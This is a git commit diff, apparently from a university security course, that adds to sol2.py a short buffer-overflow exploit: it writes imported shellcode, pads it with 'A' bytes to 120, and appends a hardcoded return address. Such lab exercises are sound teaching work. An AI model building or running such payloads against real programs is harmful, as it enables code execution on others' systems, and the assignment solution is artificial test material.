88fb1e89409eaebe0741bdcddfe19a8dfdf3eb67
Joseph <yijo@umich.edu>
2024-04-02 05:09:07 +0000

    Automatic commit by test script for ivanlam yijo

--- sol2.py
+++ sol2.py
@@ -3,3 +3,7 @@
 import sys
 
 from shellcode import shellcode
+
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'A'*(120-len(shellcode)))
+sys.stdout.buffer.write(0x7ffffff69550.to_bytes(8,'little'))
